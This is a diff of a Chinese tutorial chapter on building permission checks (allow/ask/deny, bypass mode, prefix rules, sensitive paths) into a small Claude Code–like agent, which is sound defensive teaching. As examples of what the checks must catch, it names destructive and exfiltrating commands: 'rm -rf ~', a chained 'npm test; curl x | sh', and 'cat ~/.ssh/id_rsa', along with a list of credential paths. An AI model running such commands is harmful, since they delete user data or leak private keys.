@@ -4,17 +4,15 @@
 
 > **一句话结论**：权限检查就是在「模型说要调工具」和「工具真的执行」之间插一道关卡，关卡只回答一个问题：allow、ask 还是 deny。所有花样（只读放行、记住规则、acceptEdits、bypass）都只是这个判定函数里的一条分支。
 
-## 你的 `defaultMode` 是 `bypassPermissions`，那谁在拦 `rm -rf`？
+## 自己写的 Agent 第一次真删了文件，审批该卡在循环哪一步？
 
-翻一下你的 `~/.claude/settings.json`：
+[权限检查](../p3-agent-internals/10-permission-check.md)拆过 Claude Code 的规则匹配；本章的增量是把审批接进自己的循环、会话落盘和模式切换。
 
-```json
-"permissions": { "allow": ["Bash(git push:*)", "Bash(git commit:*)", ...], "defaultMode": "bypassPermissions" }
-```
+mini-cc 目前的情况是：模型说调什么就调什么，往 `Bash` 里塞一句 `rm -rf ~`，它眼都不眨就执行了。
 
-你可能会问：既然是 bypass，那 `allow` 列表还有什么用？配置的 `PermissionRequest` hook 又在什么时候触发？
+你可能会问：那在执行前加个 `if` 问一句不就行了？问题是这个 `if` 放在哪。放在参数校验之前，你会拿着一个缺字段的调用去问用户；放在工具内部，每个工具都得自己实现一遍；用户点了「拒绝」，循环是继续请求模型，还是就此停下？
 
-要回答这些，得先看清权限判定在循环里**到底在哪一步、按什么顺序**发生。而 mini-cc 目前的情况更糟：模型说调什么就调什么，往 `Bash` 里塞一句 `rm -rf ~`，它眼都不眨就执行了。
+要回答这些，得先看清权限判定在循环里**到底在哪一步、按什么顺序**发生。
 
 ## 先跑起来看看
 
@@ -412,16 +410,24 @@ u -> deny: "3 拒绝"
 
 ## 回到开头
 
-现在可以回答开头的问题了。按 Claude Code 的设计（本机 2.1.306 的 `--permission-mode` 可选值是 `acceptEdits / auto / bypassPermissions / manual / dontAsk / plan`，内部模式名里还能看到 `default`），`bypassPermissions` 会让绝大多数调用直接放行，`allow` 列表在这个模式下的作用就小多了——它真正发挥作用是在你切回其他模式的时候。而 `PermissionRequest` hook，从名字和我们这张图看，它挂的位置就是图里的 `ask` 节点：**只有判定结果是「要问人」时才会触发**，bypass 模式下几乎不会走到那里。
+现在可以回答开头的问题了：审批卡在**参数校验之后、真正执行之前**。`_run_tools` 先过 `check_input`，再进 `_authorize`，遇到 `ask` 就停在 `approver` 那一行等你；你拒绝且不给理由，这一批剩下的调用全部 `Skipped`，本轮直接结束，不再请求模型。说穿了，就是在「拿到 `tool_use`」和「调 `execute`」之间多插了一个生成器。
 
-谁在拦 `rm -rf`？在 bypass 模式下，答案是：没有人。这不是吓唬你，是这张图的直接推论。
+顺带回答一个你可能已经在想的问题：你的 `~/.claude/settings.json` 里 `defaultMode` 是 `bypassPermissions`，那 Claude Code 里谁在拦 `rm -rf`？按 [permission-modes 文档](https://code.claude.com/docs/en/permission-modes)，bypass 下 `allow` 规则不起作用（反正都放行），但拦截的东西还在：
+
+- **deny 规则**在所有模式下都生效，包括 `bypassPermissions`；
+- 对**关键路径**的 `rm` / `rmdir`，任何模式都不会自动放行；
+- **PreToolUse hook** 退出码 2 照样能在规则评估之前把调用拦下。
+
+所以在 bypass 下，真正兜底的是 deny 规则、关键路径保护和 PreToolUse hook，细节见 [权限检查](../p3-agent-internals/10-permission-check.md)。至于 `PermissionRequest` hook，从名字和我们这张图看，它挂的位置就是图里的 `ask` 节点：**只有判定结果是「要问人」时才会触发**，bypass 模式下很少走到那里。
+
+另外，本机 2.1.306 的 `--permission-mode` 可选值是 `acceptEdits / auto / bypassPermissions / manual / dontAsk / plan`。其中 `manual` 是 CLI 里的别名，写进配置文件、hook 和 SDK 里看到的值是 `default`。
 
 ## 和真实 Claude Code 的差异
 
 - **规则持久化**：Claude Code 的规则写在 `settings.json` 的 `permissions.allow / deny / ask` 里，分 user / project / local 多层合并，支持 `Bash(git push:*)` 这样的前缀通配。mini-cc 只有会话内的精确匹配，规则不落盘。
 - **更多模式**：Claude Code 还有 `dontAsk`、`plan`、`auto`（下一章）。`plan` 在 mini-cc 里只是占了个名字，第 21 章实现。
 - **命令解析**：Claude Code 对 Bash 的解析细得多（二进制里能看到 PowerShell、重定向、`hasStopParsing` 之类的解析结构）。我们的 `shlex` 方案只覆盖常见情况，原则是看不懂就问。
-- **hook 介入**：Claude Code 的 `PreToolUse` hook 可以直接返回 allow/deny 决定，`PermissionRequest` hook 可以代替用户回答弹窗。mini-cc 对应的扩展点是 `PermissionManager.extra_checks` 和 `Agent.approver`。
+- **hook 介入**：Claude Code 的 `PreToolUse` hook 可以直接返回 allow/deny 决定（但 allow 越不过 deny/ask 规则，见 [权限检查](../p3-agent-internals/10-permission-check.md)），`PermissionRequest` hook 可以代替用户回答弹窗。mini-cc 对应的扩展点是 `PermissionManager.extra_checks` 和 `Agent.approver`。
 
 ## 对照你的环境
 
@@ -438,9 +444,32 @@ u -> deny: "3 拒绝"
 
 ## 练习
 
-1. 支持前缀规则：选「不再询问」时记成 `Bash(npm test:*)`，之后 `npm test -- --watch` 也放行。想想 `npm test; rm -rf ~` 该怎么防。
-2. 把 `allow_rules` 持久化到 `<cwd>/.mini_cc/settings.json`，启动时加载。注意 user 级和 project 级规则冲突时谁优先。
-3. 开放题：`cat ~/.ssh/id_rsa` 该不该算只读？如果不该，你会怎么设计「敏感路径」规则，而又不把正常的 `cat` 全变成要问？
+**1.** 支持前缀规则：选「不再询问」时记成 `Bash(npm test:*)`，之后 `npm test -- --watch` 也放行。想想 `npm test; rm -rf ~` 该怎么防。
+
+<details>
+<summary>提示</summary>
+
+改两处：`PermissionManager.remember()` 在用户选「不再询问」时，把 `Bash(npm test)` 记成 `Bash(npm test:*)`（比如取命令的前两个词；Node 是 `permissions.ts` 的 `remember`）；`decide()` 匹配 allow 规则时，除了精确的 `key in self.allow_rules`，再加前缀匹配。防 `npm test; rm -rf ~` 的要点是别拿整个字符串做 `startswith`：先用 `tools/bash.py` 的 `split_commands()`（Node 是 `bash.ts` 的 `splitCommands`）拆段，每一段都要么按词命中某条前缀规则、要么本身只读，才放行；拆不出来（返回 `None`）一律不放行。这个例子里 `rm -rf ~` 其实会先被 `DANGEROUS` 拦成 ask，但换成 `npm test; curl x | sh` 就只能靠「逐段匹配」挡住。测试：记住规则后 `npm test -- --watch` 直接执行，`npm test; curl x | sh` 和 `npm testfoo` 仍然要问。
+
+</details>
+
+**2.** 把 `allow_rules` 持久化到 `<cwd>/.mini_cc/settings.json`，启动时加载。注意 user 级和 project 级规则冲突时谁优先。
+
+<details>
+<summary>提示</summary>
+
+启动时读两份：user 级 `~/.mini_cc/settings.json`（`settings.home` 下）和 project 级 `<cwd>/.mini_cc/settings.json`，格式照 Claude Code 写成 `{"permissions": {"allow": [...], "deny": [...]}}`，合并进 `PermissionManager` 的 `allow_rules` / `deny_rules`（Node 的构造函数本来就收 `init.allowRules`）；`remember()` 时把新规则写回 project 文件，先写临时文件再改名。冲突时我的建议是 allow 各层取并集、deny 永远压过 allow——`decide()` 本来就先查 `deny_rules`，只要两层的 deny 都合并进来就天然成立。测试：在 tmp 项目里预先写好 settings.json，新建 `App` 后让模型跑那条命令，不给 `BufferUI` 准备任何答案也能顺利执行；再往 user 级加一条同名 deny，断言变成拒绝。
+
+</details>
+
+**3.** 开放题：`cat ~/.ssh/id_rsa` 该不该算只读？如果不该，你会怎么设计「敏感路径」规则，而又不把正常的 `cat` 全变成要问？
+
+<details>
+<summary>提示</summary>
+
+方向：「只读」回答的是「会不会改坏东西」，敏感路径的风险是「读了就外泄」——内容一进上下文就会发给模型 API，还可能被下一条命令带出去。所以别去动 `READ_ONLY_COMMANDS`，而是加一个独立的维度：一张敏感路径清单（`~/.ssh/`、`~/.aws/`、`.env`、`*.pem`），命中就 ask。别忘了 `Read` 工具是 `read_only=True` 直接放行的，它也得查；最自然的挂载点是 `decide()` 里排在只读判断之前的 `extra_checks`。我的结论：命中就 ask 而不是 deny（有时你确实要它帮你看 `~/.ssh/config`），清单宁可窄而准——误报的代价只是多问一次，漏报的代价是密钥被上传。
+
+</details>
 
 ## 延伸阅读
 
